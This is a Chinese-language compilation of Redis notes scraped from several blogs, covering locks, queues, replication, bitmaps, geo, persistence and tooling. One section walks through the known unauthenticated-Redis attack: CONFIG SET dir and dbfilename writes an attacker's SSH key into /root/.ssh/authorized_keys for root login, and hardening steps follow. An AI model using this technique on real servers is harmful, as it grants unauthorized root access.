每次遍历50条，注意是遍历50条，遍历出来的50条key还要去匹配你的模式，所以并不等于就能够取出50条key do&#123; $keysArr = $redis-&gt;scan($it, $pattern, $count); if ($keysArr) &#123; foreach ($keysArr as $key) &#123; echo $key . "\n"; &#125; &#125; &#125; while ($it &gt; 0); //每次调用 Scan会自动改变 $it 值，当$it = 0时 这次遍历结束 退出循环 https://blog.csdn.net/zhang197093/article/details/74615717https://blog.huoding.com/2014/04/11/343 有序集合实现 24 小时排行榜实时更新123456789利用 ZADD 按小时划分添加用户的积分信息，然后用 ZUNIONSTORE 并集实现 24 小时的游戏积分总和，实现 “24 小时排行榜”； ZUNIONSTORE destination numkeys key [key ...] Redis Zunionstore 命令计算给定的一个或多个有序集的并集，其中给定 key 的数量必须以 numkeys 参数指定，并 将该并集(结果集)储存到 destination 。 默认情况下，结果集中某个成员的分数值是所有给定集下该成员分数值之和 。 Redis 在遇到分数相同时是按照集合成员自身的字典顺序来排序，这里即是按照”user2″和”user3″这两个字符串进行排序，以逆序排序的话 user3 自然排到了前面。要解决这个问题，我们可以考虑在分数中加入时间戳，计算公式为： 带时间戳的分数 = 实际分数*10000000000 + (9999999999 – timestamp) https://learnku.com/articles/30279 主从配置1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677cp /usr/local/redis/redis.conf /usr/local/redis/redis.6380.conf[root@localhost redis]# vim /etc/redis/redis.confbind 0.0.0.0 # 绑定允许访问的ip地址，如本机模拟主从可不改变值仍使用127.0.0.1[root@localhost redis]# vim /usr/local/redis/redis.6380.confport 6380 # 将端口更改为6380slaveof 127.0.0.1 6379 # 指定master ip port[root@localhost redis]# redis-server /usr/local/redis/redis.conf # 启动master[root@localhost redis]# redis-server /usr/local/redis/redis.6380.conf # 启动slave查看 Master 状态[liubo@localhost ~]$ redis-cli -p 6379127.0.0.1:6379&gt; info# Server……# Clients……# Memory……# Persistence……# Stats……# Replication # 关注此区域role:master # 当前角色,masterconnected_slaves:1 # 已连接slave：1个slave0:ip=127.0.0.1,port=6380,state=online,offset=56,lag=1 # slave0信息master_replid:7e3b0e1accd31abaf58177160685d51952ea1e90master_replid2:0000000000000000000000000000000000000000master_repl_offset:56second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:1repl_backlog_histlen:56# CPU……# Cluster……查看 Slave 状态[liubo@localhost ~]$ redis-cli -p 6380127.0.0.1:6379&gt; info# Server……# Clients……# Memory……# Persistence……# Stats……# Replication # 关注此区域role:slave # 当前角色,slavemaster_host:127.0.0.1 # master相关信息master_port:6379master_link_status:up # 连接master状态master_last_io_seconds_ago:4master_sync_in_progress:0slave_repl_offset:84slave_priority:100slave_read_only:1connected_slaves:0master_replid:7e3b0e1accd31abaf58177160685d51952ea1e90master_replid2:0000000000000000000000000000000000000000master_repl_offset:84second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:1repl_backlog_histlen:84# CPUhttps://learnku.com/index.php/articles/30765 分布式锁12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379);$ok = $redis-&gt;setNX($key, $value);if ($ok) &#123; //获取到锁 ... do something ... $redis-&gt;del($key);&#125;$redis-&gt;multi();$redis-&gt;setNX($key, $value);$redis-&gt;expire($key, $ttl);$res = $redis-&gt;exec();if($res[0]) &#123; //获取到锁 ... do something ... $redis-&gt;del($key);&#125;$script = &lt;&lt;&lt;EOT local key = KEYS[1] local value = KEYS[2] local ttl = KEYS[3] local ok = redis.call('setnx', key, value) if ok == 1 then redis.call('expire', key, ttl) end return okEOT;$res = $redis-&gt;eval($script, [$key,$val, $ttl], 3);if($res) &#123; //获取到锁https://learnku.com/articles/30827 ... do something ... $redis-&gt;del($key);&#125;$ok = $redis-&gt;set($key, $random, array('nx', 'ex' =&gt; $ttl));if ($ok) &#123; //获取到锁 ... do something ... if ($redis-&gt;get($key) == $random) &#123; $redis-&gt;del($key); &#125;&#125;引入了一个随机数，这是为了防止逻辑处理时间过长导致锁的过期时间已经失效，这时候下一个请求就获得了锁，但是前一个请求在逻辑处理完直接删除了锁。锁主要用在并发请求如秒杀等场景中，以上便是 redis 锁的实现。 异步消息队列与延时队列12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379);//发送消息$redis-&gt;lPush($list, $value);//消费消息while (true) &#123; try &#123; $msg = $redis-&gt;rPop($list); if (!$msg) &#123; sleep(1); &#125; //业务处理 &#125; catch (Exception $e) &#123; echo $e-&gt;getMessage(); &#125;&#125;blpop/brpop在队列没有数据的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为零。用blpop/brpop替代前面的lpop/rpop，就完美解决了上面的问题。将有序集合的value设置为我们的消息任务，把value的score设置为消息的到期时间，然后轮询获取有序集合的中的到期消息进行处理。实现代码如下：$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379);$redis-&gt;zAdd($delayQueue,$tts, $value);while(true) &#123; try&#123; $msg = $redis-&gt;zRangeByScore($delayQueue,0,time(),0,1); if(!$msg)&#123; continue; &#125; //删除消息 $ok = $redis.zrem($delayQueue,$msg); if($ok)&#123; //业务处理 &#125; &#125; catch(\Exception $e) &#123; &#125;&#125;https://learnku.com/articles/30826HyperLogLog 算法是一种非常巧妙的近似统计海量去重元素数量的算法。它内部维护了 16384 个桶（bucket）来记录各自桶的元素数量。当一个元素到来时，它会散列到其中一个桶，以一定的概率影响这个桶的计数值。因为是概率算法，所以单个桶的计数值并不准确，但是将所有的桶计数值进行调合均值累加起来，结果就会非常接近真实的计数值。pfadd 增加计数pfcount 获取计数HyperLogLog 还提供了第三个指令 pfmerge，用于将多个 pf 计数值累加在一起形成一个新的 pf 值。比如在网站中我们有两个内容差不多的页面，运营需要将两个页面的数据进行合并。其中页面的 UV 访问量也需要合并，这时候就可以使用 pfmerge布隆过滤器可以理解为一个不怎么精确的 set 结构&gt; docker pull redislabs/rebloom # 拉取镜像&gt; docker run -p 6379:6379 redislabs/rebloom # 运行容器&gt; redis-cli # 连接容器中的 redis 服务bf.add 添加元素bf.exists 查询元素是否存在bf.madd 一次添加多个元素bf.mexists 一次查询多个元素是否存在主要是解决大规模数据下不需要精确过滤的场景，如检查垃圾邮件地址，爬虫 URL 地址去重，解决缓存穿透问题等。 geo1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162添加杭州北京上海的地理位置127.0.0.1:6379&gt; geoadd city 120.20000 30.26667 hangzhou 116.41667 39.91667 beijing 121.47 31.23 shanghaigeopos 指令可以获取集合中任意元素的经纬度坐标，可以一次获取多个。127.0.0.1:6379&gt; geopos city hangzhou beijing shanghai1) 1) "120.15000075101852417" 2) "30.2800007575645509"2) 1) "116.39999896287918091" 2) "39.90000009167092543"3) 1) "121.47000163793563843" 2) "31.22999903975783553"127.0.0.1:6379&gt; geopos city hangzhou1) 1) "120.15000075101852417" 2) "30.2800007575645509"计算距离距离单位可以是 m、km、ml、ft，分别代表米、千米、英里和尺。127.0.0.1:6379&gt; geodist city shanghai hangzhou km"164.5694"127.0.0.1:6379&gt; geodist city beijing hangzhou km"1122.7998"例如查找距离杭州300km以内的城市的10个城市按距离排序127.0.0.1:6379&gt; GEORADIUSBYMEMBER city hangzhou 300 km WITHCOORD WITHDIST WITHHASH ASC COUNT 101) 1) "hangzhou" 2) "0.0000" 3) (integer) 4054134257390783 4) 1) "120.15000075101852417" 2) "30.2800007575645509"2) 1) "shanghai" 2) "164.5694" 3) (integer) 4054803462927619 4) 1) "121.47000163793563843" 2) "31.22999903975783553"在给定以下可选项时， 命令会返回额外的信息：WITHDIST ： 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。WITHCOORD ： 将位置元素的经度和维度也一并返回。WITHHASH ： 以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。ASC ： 根据中心的位置， 按照从近到远的方式返回位置元素。DESC ： 根据中心的位置， 按照从远到近的方式返回位置元素。获取元素的 hash 值可能你还注意到有一个命令 GEOHASH, 那他是做什么的呢127.0.0.1:6379&gt; geohash city hangzhou1) "wtmkq069cc0"127.0.0.1:6379&gt; geohash city beijing1) "wx4fbxxfke0"返回的其实是元素的经纬度经过 goehash 计算后的 base32 编码字符串http://geohash.org/wtmkq069cc0 进行直接定位 其存储结构主要使用的是 Redis 的有序结构，其 score 是 GeoHash 的 52 位整数值127.0.0.1:6379&gt; ZRANGE city 0 -1 WITHSCORES1) "hangzhou"2) "4054134257390783"3) "shanghai"4) "4054803462927619"5) "beijing"6) "4069885360207904" 限流1234567891011121314151617181920212223242526272829在高并发场景下有三把利器保护系统：缓存、降级、和限流。缓存的目的是提升系统的访问你速度和增大系统能处理的容量；降级是当服务出问题或影响到核心流程的性能则需要暂时屏蔽掉。而有些场景则需要限制并发请求量，如秒杀、抢购、发帖、评论、恶意爬虫等。限流算法常见的限流算法有：计数器，漏桶、令牌桶。function isActionAllowed($userId, $action, $period, $maxCount) &#123; $redis = new Redis(); $redis-&gt;connect('127.0.0.1', 6379); $key = sprintf('hist:%s:%s', $userId, $action); $now = msectime(); # 毫秒时间戳 $pipe=$redis-&gt;multi(Redis::PIPELINE); //使用管道提升性能 $pipe-&gt;zadd($key, $now, $now); //value 和 score 都使用毫秒时间戳 $pipe-&gt;zremrangebyscore($key, 0, $now - $period); //移除时间窗口之前的行为记录，剩下的都是时间窗口内的 $pipe-&gt;zcard($key); //获取窗口内的行为数量 $pipe-&gt;expire($key, $period + 1); //多加一秒过期时间 $replies = $pipe-&gt;exec(); return $replies[2] &lt;= $maxCount;&#125;for ($i=0; $i&lt;20; $i++)&#123; var_dump(isActionAllowed("110", "reply", 60*1000, 5)); //执行可以发现只有前5次是通过的&#125;//返回当前的毫秒时间戳function msectime() &#123; list($msec, $sec) = explode(' ', microtime()); $msectime = (float)sprintf('%.0f', (floatval($msec) + floatval($sec)) * 1000); return $msectime; &#125; redis 删除大key集合的方法12345678910111213141516import redisdef test(): # StrictRedis创建连接时，这个连接由连接池管理，所以我们无需关注连接是否需要主动释放http://www.ikeguang.com/2019/03/14/redis-del-security/ re = redis.StrictRedis(host = "0.0.0.0",port = 6379,password = "123") key = "test" for i in range(100000): re.sadd(key, i) cursor = '0' cou = 200 while cursor != 0: cursor,data = re.sscan(name = key, cursor = cursor, count = cou) for item in data: re.srem(key, item) print cursor 删除redis中过时的key123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/python# -*- coding:utf-8 -*-# 需要手动删除redis中某一天产生的keyimport sysimport commands# 执行 shell 命令def execCmd(cmd): print cmd return commands.getstatusoutput(cmd)if __name__ == '__main__': args = sys.argv if len(args) != 4: print 'please input correct cmd argument, like python /home/hadoop/scripts/rediskey.py 2018-08-01 port passwd' sys.exit(1) date = args[1] port = args[2] passwd = args[3] keyPath = '/home/hadoop/scripts/rediskey.txt' cmd = '/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s keys *%s* &gt; %s'%(port, passwd, date, keyPath) (status,result) = execCmd(cmd) if status == 0: with open(keyPath) as f: line = f.readline() while line: key = line.strip() cmd = '/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s del %s'%(port, passwd, key) (status,result) = execCmd(cmd) if status == 0: print 'del key %s success'%(key) else: print 'del key %s failed...'%(key) print result line = f.readline() else: print result print 'redis %s key delete finished...'%(date)调用这个脚本，只需要输入命令：python /home/hadoop/scripts/rediskey.py '2018-08-01' 6379 '123456'四个参数： 脚本名：/home/hadoop/scripts/rediskey.py要清理的日期：2018-08-01端口：6379host：123456基本思想就是模糊匹配redis的key，保存到一个文件，然后读取文件每一行，删除key即可。http://www.ikeguang.com/2018/08/28/delete-redis-key/ redis总结123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899redis中的键的生存时间expire 设置生存时间（单位/秒）expire key seconds(秒)ttl 查看键的剩余生存时间ttl keypersist 取消生存时间persist keyexpireat指定时刻过期expireat key unix时间戳expireat key 1551858600一组redis命令要么都执行，要么都不执行。原理：先将属于一个事务的命令发送给redis进行缓存，最后再让redis依次执行这些命令。应用场景：一组命令必须同时都执行，或者都不执行。我们想要保证一组命令在执行的过程之中不被其它命令插入。multi //事务开始.....exec //事务结束，开始执行事务中的命令discard //放弃事务正因为redis不支持回滚功能，才使得redis在事务上可以保持简洁和快速。redis持久化指把数据持久化到磁盘，便于故障恢复，redis支持两种方式的持久化，可以单独使用或者结合起来使用。第一种：RDB方式（redis默认的持久化方式）第二种：AOF方式edis持久化之RDBrdb方式的持久化是通过快照完成的，当符合一定条件时redis会自动将内存中的所有数据执行快照操作并存储到硬盘上。默认存储在dump.rdb文件中。(文件名在配置文件中dbfilename)redis进行快照的时机（在配置文件redis.conf中） http://www.ikeguang.com/2018/12/12/redis-usage/save 900 1 //表示900秒内至少一个键被更改则进行快照。save 300 10 //表示300秒内10条被更改则快照save 60 10000 //60秒内10000条Redis自动实现快照的过程1、redis使用fork函数复制一份当前进程的副本(子进程)2、父进程继续接收并处理客户端发来的命令，而子进程开始将内存中的数据写入硬盘中的临时文件3、当子进程写入完所有数据后会用该临时文件替换旧的RDB文件，至此，一次快照操作完成。注意：快照时，要保证内存还有一半空间。rdb的优缺点优点：由于存储的有数据快照文件，恢复数据很方便。缺点：会丢失最后一次快照以后更改的所有数据。redis持久化之AOF把写操作指令，持续的写到一个类似日志文件里。由于写操作指令保存在日志文件里，异常恢复时把文件里面所有指令执行一遍即可。如果你执行了flushall命令，清空了redis，而你采用的aof持久化方式，那么，就可以找到这个文件，将最后一行flushall删掉，执行恢复命令，将命令全部执行一遍，这样数据就恢复了。AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。Redis 的 bit 可以用于实现比 set 内存高度压缩的计数，它通过一个 bit 1 或 0 来存储某个元素是否存在信息。例如网站唯一访客计数，可以把 user_id 作为 bit 的偏移量 offset，设置为 1 表示有访问，使用 1 MB的空间就可以存放 800 多万用户的一天访问计数情况。SETBIT key offset value # 设置位信息 setbit users 123 1GETBIT key offset # 获取位信息BITCOUNT key [start end] # 计数BITOP operation destkey key [key ...] # 位图合并基于 bit 的方法比起 set 空间消耗小得多，但是它要求元素能否简单映射为位偏移，适用面窄了不少，另外它消耗的空间取决于最大偏移量，和计数值无关，如果最大偏移量很大，消耗内存也相当可观。数据在【从服务器】里【读】，在【主服务器】里【写】。数据库分为两类，一类是主数据库（master），另一类是从数据库[1] （slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。SETBIT video:1201 200 1# 上面的命令就是设置ID为200的用户，已经看过了ID为1201的视频。 GETBIT video:1201 200# 上面的命令就是查询ID为200的用户是否观看了ID为1201的视频https://www.zhihu.com/question/27672245&gt;set zhihu "www.zhihu.com"&gt;bitcount zhihu61$str = "www.zhihu.com";for($i = 0;$i&lt;strlen($str);$i++) &#123; $bin .= sprintf("%08b", ord($str[$i]));&#125;echo ($bin); #01110111011101110111011100101110011110100110100001101001011010000111010100101110011000110110111101101101echo array_sum(str_split($bin, 1)); #61 &gt;set andy a &gt;setbit andy 6 1 &gt;setbit andy 7 0 &gt;get andy b BITCOUNT 就是统计字符串的二级制码中，有多少个'1'。 所以在这里， BITCOUNT andy 得到的结果就是 3 啦。 'a' 的ASCII码是 97。转换为二进制是：01100001。offset的学名叫做“偏移” 。二进制中的每一位就是offset值啦，比如在这里 offset 0 等于 ‘0’ ，offset 1等于'1' ,offset2等于'1',offset 7 等于'1' ，没错，offset是从左往右计数的，也就是从高位往低位。我们通过SETBIT 命令将 andy中的 'a' 变成 'b' 应该怎么变呢？也就是将 01100001 变成 01100010 （b的ASCII码是98），这个很简单啦，也就是将'a'中的offset 6从0变成1，将offset 7 从1变成0 。 bitcount key startOffset endOffset key：键值 startOffset：起始偏移量（注意：这个偏移量是以字节为单位的） endOffset：结束偏移量（注意：这个偏移量同样是以字节为单位的） 签到123456789101112131415 $dayKey = 'login:'.\date('Ymd',\time());$redis-&gt;setbit($dayKey, $this-&gt;user-&gt;id, 1);$redis-&gt;bitop('AND', 'threeAnd', 'login:20190311', 'login:20190312', 'login:20190313');echo "连续三天都签到的用户数量：" . $redis-&gt;bitCount('threeAnd');$redis-&gt;bitop('OR', 'threeOr', 'login:20190311', 'login:20190312', 'login:20190313');echo "三天中签到用户数量（有一天签也算签了）：" . $redis-&gt;bitCount('threeOr');$redis-&gt;bitop('AND', 'monthActivities'', $redis-&gt;keys('login:201903*'));echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('monthActivities');echo "当前用户指定天数是否签到：" . $redis-&gt;getbit('login:20190311', $this-&gt;user-&gt;id);https://learnku.com/articles/25181$redis-&gt;scan(0, 'match', 'login:201903*', 'count', 1000))COUNT 参数的默认值为 10 ，如果不是 0 ，你再使用 scan 3 match login:201903* 继续遍历。 Redis 分布式存储12345678910111213141516171819202122232425262728293031323334class RedisCluster &#123; public $servers = array(); public function addServer($host, $port) &#123; $redis = new Redis(); $redis-&gt;_connected = false; $redis-&gt;_host = $host; $redis-&gt;_port = $port; $this-&gt;servers[] = $redis; &#125; public function __call($method, $args) &#123; if (!method_exists("Redis", $method)) &#123; throw new Execption("not method"); &#125; $redis = $this-&gt;servers[abs(crc32($args[0])) % count($this-&gt;servers)]; if (!$redis-&gt;_connected) &#123; $redis-&gt;connect($redis-&gt;_host, $redis-&gt;_port); $redis-&gt;_connected = true; &#125; // return $redis-&gt;$method(...$args); // PHP 5.6 return call_user_func_array([$redis, $method], $args); &#125;&#125;$rc = new RedisCluster();$rc-&gt;addServer("127.0.0.1", 8000);$rc-&gt;addServer("127.0.0.1", 8001);https://learnku.com/articles/32153$rc-&gt;set("a", 1);$rc-&gt;set("b", 2);$rc-&gt;set("c", 3);$rc-&gt;set("d", 4);$rc-&gt;set("e", 5); 获取大 key12redis-cli -h 127.0.0.1 -p 7001 –-bigkeys 也可以追加一个休眠参数，防止在查询过程 ops 暴增，使用此命令：redis-cli -h 127.0.0.1 -p 7001–-bigkeys -i 0.1https://github.com/leonchen83/redis-rdb-cli redis锁12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// 如果获取到锁，则执行 $callback 回调public function get($callback = null)&#123; $result = $this-&gt;acquire(); if ($result &amp;&amp; is_callable($callback)) &#123; return tap($callback(), function () &#123; $this-&gt;release(); &#125;); &#125; return $result;&#125;// 如果获取到锁，则执行 $callback 回调// 如果没有获取到锁，会等待250毫秒，继续去获取锁// 如果在 $seconds 秒之内还没有获取到锁，会抛出 LockTimeoutException 异常public function block($seconds, $callback = null)&#123; $starting = $this-&gt;currentTime(); while (! $this-&gt;acquire()) &#123; usleep(250 * 1000); if ($this-&gt;currentTime() - $seconds &gt;= $starting) &#123; throw new LockTimeoutException; &#125; &#125; if (is_callable($callback)) &#123; return tap($callback(), function () &#123; $this-&gt;release(); &#125;); &#125; return true;&#125;class RedisLock extends Lock&#123; /** * The Redis factory implementation. * * @var \Illuminate\Redis\Connections\Connection */ protected $redis; /** * Create a new lock instance. * * @param \Illuminate\Redis\Connections\Connection $redis * @param string $name * @param int $seconds * @return void */ public function __construct($redis, $name, $seconds) &#123; parent::__construct($name, $seconds); $this-&gt;redis = $redis; &#125; /** * Attempt to acquire the lock. * * @return bool */ public function acquire() &#123; $result = $this-&gt;redis-&gt;setnx($this-&gt;name, 1); if ($result === 1 &amp;&amp; $this-&gt;seconds &gt; 0) &#123; $this-&gt;redis-&gt;expire($this-&gt;name, $this-&gt;seconds); &#125; return $result === 1; &#125; /** * Release the lock. * * @return void */ public function release() &#123; $this-&gt;redis-&gt;del($this-&gt;name); &#125;&#125;https://learnku.com/articles/33111 Redis 未授权访问配合123456789101112131415161718192021222324252627282930313233343536373839404142部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。ssh-keygen –t rsa将公钥写入 foo.txt 文件$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit $ redis-cli -h 192.168.1.11 $ 192.168.1.11:6379&gt; config set dir /root/.ssh/ OK $ 192.168.1.11:6379&gt; config get dir 1) "dir" 2) "/root/.ssh" $ 192.168.1.11:6379&gt; config set dbfilename "authorized_keys" OK $ 192.168.1.11:6379&gt; save OK这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行： $ ssh –i id_rsa root@192.168.1.11即可远程利用自己的私钥登录该服务器。当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。可以使用Pocsuite（http://github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。https://www.waitalone.cn/redis-unauthorized-of-expolit.html 配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config Redis 查看所有 key 的 value 值所占内存大小12345678910111213141516171819202122https://github.com/sripathikrishnan/redis-rdb-tools#generate-memory-report$ pip install rdbtools python-lzf$ git clone https://github.com/sripathikrishnan/redis-rdb-tools$ cd redis-rdb-tools$ sudo python setup.py install接下来找到 redis 的 dump.rdb 位置首先定位到 redis.conf 位置$ whereis redis.confredis: /etc/redis.conf$ cat /etc/redis.conf | grep dir | grep redisdir /var/lib/redis$ cat /etc/redis.conf | grep dump.rdbdbfilename dump.rdb综上，得知其路径为：/var/lib/redis/dump.rdb按内存值导出 csv$ rdb -c memory /var/lib/redis/dump.rdb &gt; /tmp/redis.csvhttps://learnku.com/articles/33211 管理平台工具 RedisManager12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849github项目地址：https://github.com/ngbdf/redis-manager下载安装：系统环境：LINUXJDK1.8#Releaseshttps://github.com/ngbdf/redis-manager/releases#当前最新版本 1.1wget https://github.com/ngbdf/redis-manager/releases/download/redismanager-1.1-release/redis-manager-1.1-release.tar.gz#创建数据库create database dbname default character set utf8mb4 collate utf8mb4_general_ci;#解压tar xf redis-manager-1.1-release.tar.gz cd redis-manager-1.1/#修改配置文件cd conf/vim application.yml#端口号server: tomcat.uri-encoding: UTF-8 port: 8182#数据库，仅需自己创建数据库即可，相关表会自动生成 datasource: name: dbname driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.1.1:3306/dbname?useUnicode=true&amp;characterEncoding=utf-8 username: user password: passwd启动访问：#执行bin目录下的start.sh脚本./bin/start.sh #查看进程ps -ef |grep java#查看端口netstat -lntp |grep 8182tcp6 0 0 :::8182 :::* LISTEN 7774/java https://me.jinchuang.org/archives/430.html Redis监控工具 redis-stat1234567891011121314151617181920212223https://github.com/junegunn/redis-statyum install ruby ruby-devel rubygem#更换gem源，使用国内镜像源下载更快gem source -a https://ruby.taobao.org/ #添加淘宝源gem source -r http://rubygems.org/ #删除境外源[root@localhost ~]# gem install redis --version 3.0.0 #默认最新是4.0版本Fetching: redis-3.0.0.gem (100%)[root@localhost ~]# gem install redis-statFetching: ansi256-0.2.5.gem (100%)Successfully installed ansi256-0.2.5使用redis-stat 命令行形式[root@localhost ~]# redis-stat 127.0.0.1:6379/usr/local/rvm/gems/ruby-2.4.1/gems/sinatra-1.3.6/lib/sinatra/base.rb:1070: warning: constant ::Fixnum is deprecated使用redis-stat webserver形式[root@localhost ~]# redis-stat 127.0.0.1:6379 --server=6666 --daemon #端口自定义/usr/local/rvm/gems/ruby-2.4.1/gems/sinatra-1.3.6/lib/sinatra/base.rb:1070: warning: constant ::Fixnum is deprecated打开http://服务器ip地址:8000 访问集群也是一样的redis-stat 192.168.16.186:7000 192.168.16.186:7001 192.168.16.186:7002 192.168.16.186:7003 192.168.16.186:7004 192.168.16.186:7005 --https://me.jinchuang.org/archives/233.html loading redis is loading the dataset in memory laravel1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost ~]# redis-cli127.0.0.1:6379&gt; ping(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.ps aux|grep redis|grep -v grep|awk '&#123;print $2&#125;'|xargs kill -9redis-server /etc/redis.conf127.0.0.1:6379[1]&gt; ping(error) LOADING Redis is loading the dataset in memoryecho 'vm.overcommit_memory = 1' &gt;&gt; /etc/sysctl.confsysctl vm.overcommit_memory=1127.0.0.1:6379&gt; pingPONG但是写不进Redis Redis被配置为保存数据库快照，但它目前不能持久化到硬盘。用来修改集合数据的命令不能用。请查看Redis日志的详细错误信息。原因强制关闭Redis快照导致不能持久化。解决方案将stop-writes-on-bgsave-error设置为no➜ sh redis-cli -h 172.16.200.xx -p 6378172.16.200.xx:6378&gt; config set stop-writes-on-bgsave-error no找到运维排查机器硬盘内存是否满了，果然，还真是硬盘内存满了，导致持久化保存快照时，发生异常。[root@localhost ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/sda2 4.0G 2.1G 1.8G 55% /tmpfs 5.9G 0 5.9G 0% /dev/shm/dev/sda7 96G 11G 80G 12% /data0/dev/sda5 7.9G 278M 7.3G 4% /tmp/dev/sda3 12G 8.8G 2.5G 79% /usr/dev/sda6 7.9G 7.8G 0 100% /var127.0.0.1:6379&gt; config get dir1) "dir"2) "/var/lib/redis"127.0.0.1:6379&gt; config get dbfilename1) "dbfilename"2) "dump.rdb"持久化文件/varlib/redis/dump.rdb 满了 写不进去了 https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshotshttp://ju.outofmemory.cn/entry/197760 提前10分钟提醒信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541.修改redis配置文件notify-keyspace-events "Ex"2.修改datebase配置文件 'notify_cache' =&gt; [ 'host' =&gt; env('REDIS_HOST', '127.0.0.1'), 'password' =&gt; env('REDIS_PASSWORD', null), 'port' =&gt; env('REDIS_PORT', 6379), 'database' =&gt; env('REDIS_DB', 4), 'read_write_timeout' =&gt; -1, // 读写超时设定 ],3.创建过期key$ttl = strtotime($data['return_time']) - time() - 600;$redis = Redis::connection('notify_cache');$redis-&gt;set('NOTIFY_CONFIRM:'.$id,$id);$redis-&gt;expire('NOTIFY_CONFIRM:'.$id,$ttl);4.创建监听队列$cache_db = config('database.redis.notify_cache.database',4);$pattern = '__keyevent@'.$cache_db.'__:expired';Redis::connection('notify_cache')-&gt;subscribe($pattern,function ($channel)&#123; // 订阅键过期事件 Log::info('-----notify-----'.$channel); $key_type = str_before($channel,':'); switch ($key_type) &#123; case 'NOTIFY_CONFIRM': $id = str_after($channel,':'); // 取出学员ID $client = Client::find($id); if ($client) &#123; //业务逻辑 &#125; &#125; break; default: break; &#125;&#125;);加入队列https://learnku.com/articles/34526const LISTEN_REDIS_NAME = 'eeop:axb:bind_log';//定时解绑做判断处理const AUTO_TIMEOUT = 60;//自动解绑60s//加入队列 有序队列$this-&gt;redis::zadd(self::LISTEN_REDIS_NAME, time() + self::AUTO_TIMEOUT, $this-&gt;bind_id);2. 解绑服务$list = $this-&gt;redis::ZRANGEBYSCORE(self::LISTEN_REDIS_NAME,0,time());foreach ($list as $value)&#123; $this-&gt;redis::zrem(self::LISTEN_REDIS_NAME, $value);&#125;https://www.jianshu.com/p/588891acd44c Redis 持久化存储1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071一种是 aof 日志追加的方式，另外一种是 rdb 数据快照的方式。RDB 持久化存储即是将 redis 存在内存中的数据以快照的形式保存在本地磁盘中。手动备份通过 save 命令和 bgsave 命令。save 是同步阻塞，而 bgsave 是非阻塞 (阻塞实际发生在 fork 的子进程中)。因此，在我们实际过程中大多是使用 bgsave 命令实现备份.自动备份a. 修改配置项 save m n 即表示在 m 秒内执行了 n 次命令则进行备份.b. 当 Redis 从服务器项主服务器发送复制请求时，主服务器则会使用 bgsave 命令生成 rbd 文件，然后传输给从服务器.c. 当执行 debug reload 命令时也会使用 save 命令生成 rdb 文件.d. 当使用 shutdown 命令关掉服务时，如果没有启用 aof 方式实现持久化则会采用 bgsave 的方式做持久化。同时 shutdown 后面可以加备份参数 [nosave|save].优势:1. 文件实现的数据快照，全量备份，便于数据的传输。比如我们需要把 A 服务器上的备份文件传输到 B 服务器上面，直接将 rdb 文件拷贝即可.2. 